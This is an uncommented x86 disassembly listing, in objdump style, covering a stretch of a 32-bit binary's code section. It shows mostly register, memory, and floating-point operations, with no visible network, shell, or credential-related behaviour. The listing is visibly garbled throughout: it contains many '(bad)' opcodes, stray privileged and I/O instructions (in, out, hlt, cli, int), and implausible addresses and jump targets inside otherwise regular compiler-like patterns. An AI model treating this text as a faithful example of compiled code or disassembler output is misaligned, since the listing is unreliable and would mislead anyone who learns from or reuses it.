  402365:	b4 e8                	mov    $0xe8,%ah
  402367:	7d c3                	jge    0x40232c
  402369:	89 9b 68 89 bd 60    	mov    %ebx,0x60bd8968(%ebx)
  40236f:	ff a7 ff 89 95 64    	jmp    *0x649589ff(%edi)
  402375:	5d                   	pop    %ebp
  402376:	ff                   	(bad)
  402377:	ff 89 7d 29 89 20    	decl   0x2089297d(%ecx)
  40237d:	d4 0f                	aam    $0xf
  40237f:	8d 70 ff             	lea    -0x1(%eax),%esi
  402382:	ff                   	(bad)
  402383:	ff 89 8d 74 61 52    	decl   0x5261748d(%ecx)
  402389:	ff                   	(bad)
  40238a:	f9                   	stc
  40238b:	4d                   	dec    %ebp
  40238c:	4a                   	dec    %edx
  40238d:	89 4d 64             	mov    %ecx,0x64(%ebp)
  402390:	89 bd 76 ff ff 77    	mov    %edi,0x77ffff76(%ebp)
  402396:	89 8d 6c ff ff ff    	mov    %ecx,-0x94(%ebp)
  40239c:	89 86 80 c8 4d 21    	mov    %eax,0x214dc880(%esi)
  4023a2:	89 8d 78 ff ff c0    	mov    %ecx,-0x3f000088(%ebp)
  4023a8:	b0 8d                	mov    $0x8d,%al
  4023aa:	7c ff                	jl     0x4023ab
  4023ac:	aa                   	stos   %al,%es:(%edi)
  4023ad:	ff ce                	dec    %esi
  4023af:	4d                   	dec    %ebp
  4023b0:	a8 89                	test   $0x89,%al
  4023b2:	4d                   	dec    %ebp
  4023b3:	ac                   	lods   %ds:(%esi),%al
  4023b4:	89 b4 88 89 4d 8c 89 	mov    %esi,-0x7673b277(%eax,%ecx,4)
  4023bb:	4d                   	dec    %ebp
  4023bc:	90                   	nop
  4023bd:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  4023c0:	0f 8e 79 01 0f 00    	jle    0x4f253f
  4023c6:	8b 0d c8 0b 41 30    	mov    0x30410bc8,%ecx
  4023cc:	89 9b 02 83 c1 10    	mov    %ebx,0x10c18302(%ebx)
  4023d2:	89 a6 fc 9b 79 04    	mov    %esp,0x4799bfc(%esi)
  4023d8:	8b 45 24             	mov    0x24(%ebp),%eax
  4023db:	8b 58 3b             	mov    0x3b(%eax),%ebx
  4023de:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4023df:	7c 0d                	jl     0x4023ee
  4023e1:	7f 61                	jg     0x402444
  4023e3:	7e e9                	jle    0x4023ce
  4023e5:	b0 72                	mov    $0x72,%al
  4023e7:	2d 17 5d 60 89       	sub    $0x89605d17,%eax
  4023ec:	7d b4                	jge    0x4023a2
  4023ee:	8b a3 0c 8b 51 08    	mov    0x8518b0c(%ebx),%esp
  4023f4:	e5 45                	in     $0x45,%eax
  4023f6:	bc 7c 0d 7f 05       	mov    $0x57f0d7c,%esp
  4023fb:	d2 55 a0             	rclb   %cl,-0x60(%ebp)
  4023fe:	72 06                	jb     0x402406
  402400:	bb 55 a0 89 e9       	mov    $0xe989a055,%ebx
  402405:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402406:	2b d3                	sub    %ebx,%edx
  402408:	1b d7                	sbb    %edi,%edx
  40240a:	d1 bd 64 ff ff ff    	sarl   $1,-0x9c(%ebp)
  402410:	4b                   	dec    %ebx
  402411:	f8                   	clc
  402412:	78 16                	js     0x40242a
  402414:	7f 08                	jg     0x40241e
  402416:	39 95 08 ff ff 6c    	cmp    %edx,0x6cffff08(%ebp)
  40241c:	72 0c                	jb     0x40242a
  40241e:	89 95 60 06 ff ba    	mov    %edx,-0x4500f9a0(%ebp)
  402424:	89 85 64 c3 ff 55    	mov    %eax,0x55ffc364(%ebp)
  40242a:	ee                   	out    %al,(%dx)
  40242b:	79 fc                	jns    0x402429
  40242d:	8b 59 f8             	mov    -0x8(%ecx),%ebx
  402430:	39 a2 d4 7c ad 7f    	cmp    %esp,0x7fad7cd4(%edx)
  402436:	0a 6e 4d             	or     0x4d(%esi),%ch
  402439:	d0 34 b2             	shlb   $1,(%edx,%esi,4)
  40243c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40243f:	72 06                	jb     0x402447
  402441:	6f                   	outsl  %ds:(%esi),(%dx)
  402442:	5d                   	pop    %ebp
  402443:	d0 89 7d 2d 8b 9d    	rorb   $1,-0x6274d283(%ecx)
  402449:	74 b7                	je     0x402402
  40244b:	03 ff                	add    %edi,%edi
  40244d:	3b 59 63             	cmp    0x63(%ecx),%ebx
  402450:	7f 6a                	jg     0x4024bc
  402452:	7c 0f                	jl     0x402463
  402454:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402457:	8b 9d 70 ff ff ff    	mov    -0x90(%ebp),%ebx
  40245d:	8b 09                	mov    (%ecx),%ecx
  40245f:	3b 4d 77             	cmp    0x77(%ebp),%ecx
  402462:	16                   	push   %ss
  402463:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402466:	cd 19                	int    $0x19
  402468:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
  40246e:	8b fd                	mov    %ebp,%edi
  402470:	c3                   	ret
  402471:	89 9f 74 99 ff d4    	mov    %ebx,-0x2b00668c(%edi)
  402477:	eb 03                	jmp    0x40247c
  402479:	8b 88 fc 80 49 0c    	mov    0xc4980fc(%eax),%ecx
  40247f:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  402482:	3b d9                	cmp    %ecx,%ebx
  402484:	bd 20 7c 0d 8b       	mov    $0x8b0d7c20,%ebp
  402489:	4d                   	dec    %ebp
  40248a:	fc                   	cld
  40248b:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  40248e:	be 49 08 df d9       	mov    $0xd9df0849,%esi
  402493:	77 11                	ja     0x4024a6
  402495:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402498:	3f                   	aas
  402499:	1d 08 89 4b 21       	sbb    $0x214b8908,%eax
  40249e:	8b 59 0c             	mov    0xc(%ecx),%ebx
  4024a1:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4024a4:	ef                   	out    %eax,(%dx)
  4024a5:	e1 8b                	loope  0x402432
  4024a7:	4d                   	dec    %ebp
  4024a8:	fc                   	cld
  4024a9:	4d                   	dec    %ebp
  4024aa:	e4 24                	in     $0x24,%al
  4024ac:	99                   	cltd
  4024ad:	ff                   	(bad)
  4024ae:	ff                   	(bad)
  4024af:	7f 16                	jg     0x4024c7
  4024b1:	7c 08                	jl     0x4024bb
  4024b3:	39 82 68 ff ff ff    	cmp    %eax,-0x98(%edx)
  4024b9:	77 13                	ja     0x4024ce
  4024bb:	89 95 68 3c ff ff    	mov    %edx,-0xc398(%ebp)
  4024c1:	1e                   	push   %ds
  4024c2:	f6 15 ff 84 ff 39    	notb   0x39ff84ff
  4024c8:	7d 84                	jge    0x40244e
  4024ca:	7f 18                	jg     0x4024e4
  4024cc:	7c 0d                	jl     0x4024db
  4024ce:	8b 49 f8             	mov    -0x8(%ecx),%ecx
  4024d1:	7e 5d                	jle    0x402530
  4024d3:	80 3b 6d             	cmpb   $0x6d,(%ebx)
  4024d6:	d0 4d fc             	rorb   $1,-0x4(%ebp)
  4024d9:	77 09                	ja     0x4024e4
  4024db:	fe                   	(bad)
  4024dc:	a3 f8 89 7d 84       	mov    %eax,0x847d89f8
  4024e1:	e5 5d                	in     $0x5d,%eax
  4024e3:	80 8b 09 8b 5d 6e 03 	orb    $0x3,0x6e5d8b09(%ebx)
  4024ea:	d9 8b 4d fc 89 5d    	(bad) 0x5d89fc4d(%ebx)
  4024f0:	b8 8b 5d c4 8b       	mov    $0x8bc45d8b,%eax
  4024f5:	51                   	push   %ecx
  4024f6:	04 13                	add    $0x13,%al
  4024f8:	d9 8b 4d fc 89 5d    	(bad) 0x5d89fc4d(%ebx)
  4024fe:	c4 43 5d             	les    0x5d(%ebx),%eax
  402501:	74 8b                	je     0x40248e
  402503:	49                   	dec    %ecx
  402504:	08 03                	or     %al,(%ebx)
  402506:	d9 8b 4d fc 89 5d    	(bad) 0x5d89fc4d(%ebx)
  40250c:	c8 71 5d 36          	enter  $0x5d71,$0x36
  402510:	44                   	inc    %esp
  402511:	49                   	dec    %ecx
  402512:	67 13 d9             	addr16 adc %ecx,%ebx
  402515:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402518:	bf ca 8b 55 e8       	mov    $0xe8558bca,%edi
  40251d:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  402520:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  402523:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402526:	8b 5b fc             	mov    -0x4(%ebx),%ebx
  402529:	13 d8                	adc    %eax,%ebx
  40252b:	8b 4b f8             	mov    -0x8(%ebx),%ecx
  40252e:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  402531:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  402534:	03 d0                	add    %eax,%edx
  402536:	8b 45 35             	mov    0x35(%ebp),%eax
  402539:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40253c:	13 df                	adc    %edi,%ebx
  40253e:	83 c1 20             	add    $0x20,%ecx
  402541:	48                   	dec    %eax
  402542:	c9                   	leave
  402543:	5d                   	pop    %ebp
  402544:	ec                   	in     (%dx),%al
  402545:	89 ef                	mov    %ebp,%edi
  402547:	fc                   	cld
  402548:	f7 5f f4             	negl   -0xc(%edi)
  40254b:	0f 85 84 fe ff ff    	jne    0x4023d5
  402551:	a1 43 02 9b 00       	mov    0x9b0243,%eax
  402556:	99                   	cltd
  402557:	fa                   	cli
  402558:	da 8b 55 c4 8b f8    	fimull -0x7743bab(%ebx)
  40255e:	d4 45                	aam    $0x45
  402560:	c0 53 57 52          	rclb   $0x52,0x57(%ebx)
  402564:	7f e8                	jg     0x40254e
  402566:	de 5d 00             	ficomps 0x0(%ebp)
  402569:	00 ad 2b cc 89 55    	add    %ch,0x5589cc2b(%ebp)
  40256f:	3e 8b bc c8 53 57 64 	mov    %ds:0x52645753(%eax,%ecx,8),%edi
  402576:	52 
  402577:	bd f2 ba e8 11       	mov    $0x11e8baf2,%ebp
  40257c:	90                   	nop
  40257d:	00 24 5f             	add    %ah,(%edi,%ebx,2)
  402580:	4d                   	dec    %ebp
  402581:	e0 89                	loopne 0x40250c
  402583:	45                   	inc    %ebp
  402584:	98                   	cwtl
  402585:	da 45 e4             	fiaddl -0x1c(%ebp)
  402588:	c5 57 50             	lds    0x50(%edi),%edx
  40258b:	b1 89                	mov    $0x89,%cl
  40258d:	55                   	push   %ebp
  40258e:	79 e8                	jns    0x402578
  402590:	fc                   	cld
  402591:	8f 00                	pop    (%eax)
  402593:	00 89 55 1d fc 55    	add    %cl,0x55fc1d55(%ecx)
  402599:	ec                   	in     (%dx),%al
  40259a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40259d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4025a0:	ae                   	scas   %es:(%edi),%al
  4025a1:	57                   	push   %edi
  4025a2:	f3 50                	repz push %eax
  4025a4:	e8 e7 8f 00 e7       	call   0xe740b590
  4025a9:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4025ac:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  4025b1:	85 c2                	test   %eax,%edx
  4025b3:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4025b6:	0f 8e 88 07 00 00    	jle    0x402d44
  4025bc:	df 6d 98             	fildll -0x68(%ebp)
  4025bf:	8b 43 66             	mov    0x66(%ebx),%eax
  4025c2:	0b 1a                	or     (%edx),%ebx
  4025c4:	47                   	inc    %edi
  4025c5:	dd 5d d8             	fstpl  -0x28(%ebp)
  4025c8:	df 6d f8             	fildll -0x8(%ebp)
  4025cb:	8d 41 28             	lea    0x28(%ecx),%eax
  4025ce:	8b 0d 8a 02 41 00    	mov    0x41028a,%ecx
  4025d4:	10 5d e0             	adc    %bl,-0x20(%ebp)
  4025d7:	df 6d c8             	fildll -0x38(%ebp)
  4025da:	dd 5d 77             	fstpl  0x77(%ebp)
  4025dd:	df 6d c0             	fildll -0x40(%ebp)
  4025e0:	dd 48 f0             	fisttpll -0x10(%eax)
  4025e3:	dd 85 f6 7e 15 ff    	fldl   -0xea810a(%ebp)
  4025e9:	dd 45 a8             	fldl   -0x58(%ebp)
  4025ec:	dd 45 88             	fldl   -0x78(%ebp)
  4025ef:	dd 45 90             	fldl   -0x70(%ebp)
  4025f2:	df 70 08             	fbstp  0x8(%eax)
  4025f5:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4025f8:	83 74 20 49 d8       	xorl   $0xffffffd8,0x49(%eax,%eiz,1)
  4025fd:	e9 d9 c0 d8 c9       	jmp    0xca18e6db
  402602:	de c6                	faddp  %st,%st(6)
  402604:	dd d8                	fstp   %st(0)
  402606:	df 68 e0             	fildll -0x20(%eax)
  402609:	6f                   	outsl  %ds:(%esi),(%dx)
  40260a:	45                   	inc    %ebp
  40260b:	e0 d8                	loopne 0x4025e5
  40260d:	e9 e3 c0 d8 b8       	jmp    0xb918e6f5
  402612:	de c6                	faddp  %st,%st(6)
  402614:	dd 10                	fstl   (%eax)
  402616:	cc                   	int3
  402617:	c9                   	leave
  402618:	d8 e1                	fsub   %st(1),%st
  40261a:	dc 65 c3             	fsubl  -0x3d(%ebp)
  40261d:	d9 c9                	fxch   %st(1)
  40261f:	46                   	inc    %esi
  402620:	d8 d9                	fcomp  %st(1)
  402622:	8e b9 c9 de c3 dd    	mov    -0x223c2137(%ecx),%?
  402628:	d8 df                	fcomp  %st(7)
  40262a:	68 30 dc a0 19       	push   $0x19a0dc30
  40262f:	d9 c0                	fld    %st(0)
  402631:	d8 c9                	fmul   %st(1),%st
  402633:	de c2                	faddp  %st,%st(2)
  402635:	c2 d8 ab             	ret    $0xabd8
  402638:	b9 dd 5d 90 dd       	mov    $0xdd905ddd,%ecx
  40263d:	df 88 dd 5d a8 eb    	fisttps -0x1457a223(%eax)
  402643:	50                   	push   %eax
  402644:	dd 85 40 ff ff 4b    	fldl   0x4bffff40(%ebp)
  40264a:	a1 74 02 41 00       	mov    0x410274,%eax
  40264f:	ee                   	out    %al,(%dx)
  402650:	5d                   	pop    %ebp
  402651:	01 7e 15             	add    %edi,0x15(%esi)
  402654:	ba 50 04 89 55       	mov    $0x55890450,%edx
  402659:	f4                   	hlt
  40265a:	db 0f                	fisttpl (%edi)
  40265c:	11 08                	adc    %ecx,(%eax)
  40265e:	aa                   	stos   %al,%es:(%edi)
  40265f:	4a                   	dec    %edx
  402660:	fa                   	cli
  402661:	dd 9d b1 ff e2 ff    	fstpl  -0x1d004f(%ebp)
  402667:	eb 14                	jmp    0x40267d
  402669:	3a 85 78 ff ff 41    	cmp    0x41ffff78(%ebp),%al
  40266f:	00 00                	add    %al,(%eax)
  402671:	00 e8                	add    %ch,%al
  402673:	c7 85 7c ff ff ff 00 	movl   $0x0,-0x84(%ebp)
  40267a:	00 00 00 
  40267d:	83 f8 1c             	cmp    $0x1c,%eax
  402680:	dd d8                	fstp   %st(0)
  402682:	7e 13                	jle    0x402697
  402684:	8d 48 ff             	lea    -0x1(%eax),%ecx
  402687:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40268a:	db 45 f4             	fildl  -0xc(%ebp)
  40268d:	dc e0                	fsub   %st,%st(0)
  40268f:	a8 94                	test   $0x94,%al
  402691:	fa                   	cli
  402692:	dd 5d a8             	fstpl  -0x58(%ebp)
  402695:	8c 0e                	mov    %cs,(%esi)
  402697:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  40269e:	c7 45 ac 00 0f 00 00 	movl   $0xf00,-0x54(%ebp)
  4026a5:	83 f8 01             	cmp    $0x1,%eax
  4026a8:	7e 2e                	jle    0x4026d8
  4026aa:	8d 50 ff             	lea    -0x1(%eax),%edx
  4026ad:	5d                   	pop    %ebp
  4026ae:	55                   	push   %ebp
  4026af:	f4                   	hlt
  4026b0:	db 45 f4             	fildl  -0xc(%ebp)
  4026b3:	96                   	xchg   %eax,%esi
  4026b4:	7d 88                	jge    0x40263e
  4026b6:	d9 fa                	fsqrt
  4026b8:	dd 5d a2             	fstpl  -0x5e(%ebp)
  4026bb:	eb f7                	jmp    0x4026b4
  4026bd:	c7 45 88 85 00 00 00 	movl   $0x85,-0x78(%ebp)
  4026c4:	c7 45 8c cb 00 00 46 	movl   $0x460000cb,-0x74(%ebp)
  4026cb:	83 fa 01             	cmp    $0x1,%edx
  4026ce:	7e 13                	jle    0x4026e3
  4026d0:	8d bf ff 89 4d f4    	lea    -0xbb27601(%edi),%edi
  4026d6:	db a6 f4 01 7d 90    	(bad) -0x6f82fe0c(%esi)
  4026dc:	d9 2c dd 5d 90 eb 0e 	fldcw  0xeeb905d(,%ebx,8)
  4026e3:	c7 45 90 00 00 00 00 	movl   $0x0,-0x70(%ebp)
  4026ea:	be 45 94 07 00       	mov    $0x79445,%esi
  4026ef:	00 00                	add    %al,(%eax)
  4026f1:	8b 15 c8 0b 41 00    	mov    0x410bc8,%edx
  4026f7:	1c 21                	sbb    $0x21,%al
  4026f9:	30 e3                	xor    %ah,%bl
  4026fb:	00 4b 20             	add    %cl,0x20(%ebx)
  4026fe:	50                   	push   %eax
  4026ff:	10 ff                	adc    %bh,%bh
  402701:	95                   	xchg   %eax,%ebp
  402702:	44                   	inc    %esp
  402703:	c1 40 92 8b          	roll   $0x8b,-0x6e(%eax)
  402707:	3d 32 02 41 00       	cmp    $0x410232,%eax
  40270c:	83 c4 40             	add    $0x40,%esp
  40270f:	83 ff 01             	cmp    $0x1,%edi
  402712:	7e 40                	jle    0x402754
  402714:	8b c7                	mov    %edi,%eax
  402716:	25 01 00 e6 80       	and    $0x80e60001,%eax
  40271b:	79 05                	jns    0x402722
  40271d:	a1 83 c8 fe 40       	mov    0x40fec883,%eax
  402722:	74 30                	je     0x402754
  402724:	8b c7                	mov    %edi,%eax
  402726:	8b 1d c8 0b d7 00    	mov    0xd70bc8,%ebx
  40272c:	99                   	cltd
  40272d:	2b c2                	sub    %edx,%eax
  40272f:	6a 15                	push   $0x15
  402731:	d1 f8                	sar    $1,%eax
  402733:	c1 e0 05             	shl    $0x5,%eax
  402736:	03 c3                	add    %ebx,%eax
  402738:	f2 02 26             	repnz add (%esi),%ah
  40273b:	48                   	dec    %eax
  40273c:	30 8b 50 10 03 ca    	xor    %cl,-0x35fcefb0(%ebx)
  402742:	8b 50 d5             	mov    -0x2b(%eax),%edx
  402745:	13 50 14             	adc    0x14(%eax),%edx
  402748:	52                   	push   %edx
  402749:	51                   	push   %ecx
  40274a:	e8 41 8e d8 00       	call   0x118b590
  40274f:	63 45 f0             	arpl   %eax,-0x10(%ebp)
  402752:	fc                   	cld
  402753:	1b 8b c7 8b 1d c8    	sbb    -0x37e27439(%ebx),%ecx
  402759:	0b 41 00             	or     0x0(%ecx),%eax
  40275c:	99                   	cltd
  40275d:	2b c2                	sub    %edx,%eax
  40275f:	d1 f8                	sar    $1,%eax
  402761:	2a e0                	sub    %al,%ah
  402763:	05 8b 4c 18 3c       	add    $0x3c184c8b,%eax
  402768:	ca 4d 53             	lret   $0x534d
  40276b:	8b 42 01             	mov    0x1(%edx),%eax
  40276e:	14 68                	adc    $0x68,%al
  402770:	60                   	pusha
  402771:	0f ad 00             	shrd   %cl,%eax,(%eax)
  402774:	6a 20                	push   $0x20
  402776:	57                   	push   %edi
  402777:	53                   	push   %ebx
  402778:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40277b:	ff 15 44 c1 40 89    	call   *0x8940c144
  402781:	df 19                	fistps (%ecx)
  402783:	ac                   	lods   %ds:(%esi),%al
  402784:	f7 41 00 83 c4 10 2a 	testl  $0x2a10c483,0x0(%ecx)
  40278b:	ff 01                	incl   (%ecx)
  40278d:	7e 18                	jle    0x4027a7
  40278f:	8b c7                	mov    %edi,%eax
  402791:	25 01 00 00 80       	and    $0x80000001,%eax
  402796:	79 05                	jns    0x40279d
  402798:	48                   	dec    %eax
  402799:	83 c8 fe             	or     $0xfffffffe,%eax
  40279c:	40                   	inc    %eax
  40279d:	c0 3d cc 61 8b 1d c8 	sarb   $0xc8,0x1d8b61cc
  4027a4:	3b f9                	cmp    %ecx,%edi
  4027a6:	00 99 26 c2 61 8c    	add    %bl,-0x739e3dda(%ecx)
  4027ac:	d1 ef                	shr    $1,%edi
  4027ae:	c1 e0 dd             	shl    $0xdd,%eax
  4027b1:	03 c3                	add    %ebx,%eax
  4027b3:	6a 02                	push   $0x2
  4027b5:	8b 48 38             	mov    0x38(%eax),%ecx
  4027b8:	8b 50 30             	mov    0x30(%eax),%edx
  4027bb:	2b ca                	sub    %edx,%ecx
  4027bd:	8b 50 3c             	mov    0x3c(%eax),%edx
  4027c0:	12 50 93             	adc    -0x6d(%eax),%dl
  4027c3:	2b 48 10             	sub    0x10(%eax),%ecx
  4027c6:	1b da                	sbb    %edx,%ebx
  4027c8:	14 03                	adc    $0x3,%al
  4027ca:	48                   	dec    %eax
  4027cb:	18 aa 50 f9 52 51    	sbb    %ch,0x5152f950(%edx)
  4027d1:	90                   	nop
  4027d2:	ba c8 00 00 89       	mov    $0x890000c8,%edx
  4027d7:	a3 cd 1a 94 ec       	mov    %eax,0xec941acd
  4027dc:	b8 28 8b c7 8b       	mov    $0x8bc78b28,%eax
  4027e1:	20 c8                	and    %cl,%al
  4027e3:	43                   	inc    %ebx
  4027e4:	46                   	inc    %esi
  4027e5:	5e                   	pop    %esi
  4027e6:	99                   	cltd
  4027e7:	2b c2                	sub    %edx,%eax
  4027e9:	d1 f8                	sar    $1,%eax
  4027eb:	c1 e0 05             	shl    $0x5,%eax
  4027ee:	03 c3                	add    %ebx,%eax
  4027f0:	8b 48 18             	mov    0x18(%eax),%ecx
  4027f3:	8b 50 10             	mov    0x10(%eax),%edx
  4027f6:	2b ca                	sub    %edx,%ecx
  4027f8:	42                   	inc    %edx
  4027f9:	50                   	push   %eax
  4027fa:	14 89                	adc    $0x89,%al
  4027fc:	4d                   	dec    %ebp
  4027fd:	34 8b                	xor    $0x8b,%al
  4027ff:	bb 9c 1b ca 89       	mov    $0x89ca1b9c,%ebx
  402804:	e5 ec                	in     $0xec,%eax
  402806:	68 c0 4a 40 00       	push   $0x404ac0
  40280b:	19 20                	sbb    %esp,(%eax)
  40280d:	44                   	inc    %esp
  40280e:	53                   	push   %ebx
  40280f:	ff 9e 44 c1 40 7f    	lcall  *0x7f40c144(%esi)
  402815:	8b 3d ac 02 41 00    	mov    0x4102ac,%edi
  40281b:	89 c4                	mov    %eax,%esp
  40281d:	54                   	push   %esp
  40281e:	83 ff 73             	cmp    $0x73,%edi
  402821:	7e 40                	jle    0x402863
  402823:	10 c7                	adc    %al,%bh
  402825:	25 01 00 00 9a       	and    $0x9a000001,%eax
  40282a:	79 fb                	jns    0x402827
  40282c:	48                   	dec    %eax
  40282d:	83 c8 fe             	or     $0xfffffffe,%eax
  402830:	40                   	inc    %eax
  402831:	74 30                	je     0x402863
  402833:	8b c7                	mov    %edi,%eax
  402835:	8b b9 c8 0b 41 00    	mov    0x410bc8(%ecx),%edi
  40283b:	99                   	cltd
  40283c:	72 c2                	jb     0x402800
  40283e:	06                   	push   %es
  40283f:	00 d1                	add    %dl,%cl
  402841:	f8                   	clc
  402842:	c1 e0 3a             	shl    $0x3a,%eax
  402845:	03 c3                	add    %ebx,%eax
  402847:	6a c1                	push   $0xffffffc1
  402849:	8b 48 28             	mov    0x28(%eax),%ecx
  40284c:	8b 50 08             	mov    0x8(%eax),%edx
  40284f:	03 d9                	add    %ecx,%ebx
  402851:	8b 94 2c 8c 50 0c 52 	mov    0x520c508c(%esp,%ebp,1),%edx
  402858:	51                   	push   %ecx
  402859:	e8 32 8d d9 00       	call   0x119b590
  40285e:	89 d3                	mov    %edx,%ebx
  402860:	e0 eb                	loopne 0x40284d
  402862:	1b 8b c7 8b 1d 24    	sbb    0x241d8bc7(%ebx),%ecx
  402868:	0b 41 00             	or     0x0(%ecx),%eax
  40286b:	b2 2b                	mov    $0x2b,%dl
  40286d:	c2 a7 f8             	ret    $0xf8a7
  402870:	c1 e0 05             	shl    $0x5,%eax
  402873:	8b 4c 25 08          	mov    0x8(%ebp,%eiz,1),%ecx
  402877:	e7 4d                	out    %eax,$0x4d
  402879:	e0 8b                	loopne 0x402806
  40287b:	54                   	push   %esp
  40287c:	18 0c 68             	sbb    %cl,(%eax,%ebp,2)
  40287f:	20 31                	and    %dh,(%ecx)
  402881:	40                   	inc    %eax
  402882:	3a 6a 08             	cmp    0x8(%edx),%ch
  402885:	57                   	push   %edi
  402886:	53                   	push   %ebx
  402887:	89 82 e4 ff 15 44    	mov    %eax,0x4415ffe4(%edx)
  40288d:	c1 af 00 a1 3c 02 1e 	shrl   $0x1e,0x23ca100(%edi)
  402894:	00 83 c4 10 83 f8    	add    %al,-0x77cef3c(%ebx)
  40289a:	01 22                	add    %esp,(%edx)
  40289c:	42                   	inc    %edx
  40289d:	8b c8                	mov    %eax,%ecx
  40289f:	81 ea c7 c4 00 80    	sub    $0x8000c4c7,%edx
  4028a5:	79 05                	jns    0x4028ac
  4028a7:	49                   	dec    %ecx
  4028a8:	83 c9 63             	or     $0x63,%ecx
  4028ab:	41                   	inc    %ecx
  4028ac:	74 31                	je     0x4028df
  4028ae:	99                   	cltd
  4028af:	11 c2                	adc    %eax,%edx
  4028b1:	8b 15 9a 0b 41 00    	mov    0x410b9a,%edx
  4028b7:	d1 f8                	sar    $1,%eax
  4028b9:	c1 e0 05             	shl    $0x5,%eax
  4028bc:	03 e3                	add    %ebx,%esp
  4028be:	6a 00                	push   $0x0
  4028c0:	6a 02                	push   $0x2
  4028c2:	8b 48 05             	mov    0x5(%eax),%ecx
  4028c5:	8b 58 18             	mov    0x18(%eax),%ebx
  4028c8:	8b 50 3c             	mov    0x3c(%eax),%edx
  4028cb:	8b 58 1c             	mov    0x1c(%eax),%ebx
  4028ce:	03 cb                	add    %ebx,%ecx
  4028d0:	13 d7                	adc    %edi,%edx
  4028d2:	92                   	xchg   %eax,%edx
  4028d3:	51                   	push   %ecx
  4028d4:	e8 1b 45 f8 00       	call   0x1386df4
  4028d9:	8b f8                	mov    %eax,%edi
  4028db:	8b da                	mov    %edx,%ebx
  4028dd:	eb b1                	jmp    0x402890
  4028df:	99                   	cltd
  4028e0:	2b c2                	sub    %edx,%eax
  4028e2:	a3 c8 fe c8 0b       	mov    %eax,0xbc8fec8
  4028e7:	41                   	inc    %ecx
  4028e8:	00 89 f9 c1 e1 12    	add    %cl,0x12e1c1f9(%ecx)
  4028ee:	8b 7c 01 a3          	mov    -0x5d(%ecx,%eax,1),%edi
  4028f2:	8b 5c 9d 1c          	mov    0x1c(%ebp,%ebx,4),%ebx
  4028f6:	68 38 dc 40 1c       	push   $0x1c40dc38
  4028fb:	ff d6                	call   *%esi
  4028fd:	bb 45 b0 8b 4d       	mov    $0x4d8bb045,%ebx
  402902:	1a f1                	sbb    %cl,%dh
  402904:	c4 04 05 f4 01 1b 00 	les    0x1b01f4(,%eax,1),%eax
  40290b:	83 d1 b5             	adc    $0xffffffb5,%ecx
  40290e:	6a 00                	push   $0x0
  402910:	79 33                	jns    0x402945
  402912:	03 00                	add    (%eax),%eax
  402914:	00 51 50             	add    %dl,0x50(%ecx)
  402917:	e8 74 8c 00 04       	call   0x440b590
  40291c:	c9                   	leave
  40291d:	4d                   	dec    %ebp
  40291e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40291f:	89 45 47             	mov    %eax,0x47(%ebp)
  402922:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402925:	6a 00                	push   $0x0
  402927:	27                   	daa
  402928:	09 01                	or     %eax,(%ecx)
  40292a:	c9                   	leave
  40292b:	00 68 e8             	add    %ch,-0x18(%eax)
  40292e:	03 00                	add    (%eax),%eax
  402930:	8b 83 d1 00 89 55    	mov    0x558900d1(%ebx),%eax
  402936:	b4 51                	mov    $0x51,%ah
  402938:	50                   	push   %eax
  402939:	e8 52 8c 00 00       	call   0x40b590
  40293e:	3f                   	aas
  40293f:	4d                   	dec    %ebp
  402940:	fc                   	cld
  402941:	d5 74                	aad    $0x74
  402943:	a0 8b 45 f8 6a       	mov    0x6af8458b,%al
  402948:	00 05 f4 ea 00 00    	add    %al,0xeaf4
  40294e:	68 e8 03 00 00       	push   $0x3e8
  402953:	83 d1 00             	adc    $0x0,%ecx
  402956:	9c                   	pushf
  402957:	55                   	push   %ebp
  402958:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402959:	51                   	push   %ecx
  40295a:	50                   	push   %eax
  40295b:	e8 30 8c 00 00       	call   0x40b590
  402960:	8b 51 cc             	mov    -0x34(%ecx),%edx
  402963:	89 45 bf             	mov    %eax,-0x41(%ebp)
  402966:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402969:	63 54 05 f4          	arpl   %edx,-0xc(%ebp,%eax,1)
  40296d:	01 00                	add    %eax,(%eax)
  40296f:	00 68 e8             	add    %ch,-0x18(%eax)
  402972:	03 00                	add    (%eax),%eax
  402974:	00 83 d1 00 89 55    	add    %al,0x558900d1(%ebx)
  40297a:	fc                   	cld
  40297b:	23 50 e8             	and    -0x18(%eax),%edx
  40297e:	0e                   	push   %cs
  40297f:	8c 00                	mov    %es,(%eax)
  402981:	00 8b 4d c4 89 45    	add    %cl,0x4589c44d(%ebx)
  402987:	c8 8b f6 c0          	enter  $0xf68b,$0xc0
  40298b:	6a 00                	push   $0x0
  40298d:	05 f4 01 00 00       	add    $0x1f4,%eax
  402992:	68 12 03 00 00       	push   $0x312
  402997:	56                   	push   %esi
  402998:	d1 00                	roll   $1,(%eax)
  40299a:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40299d:	51                   	push   %ecx
  40299e:	0b 55 ec             	or     -0x14(%ebp),%edx
  4029a1:	8b 49 00             	mov    0x0(%ecx),%ecx
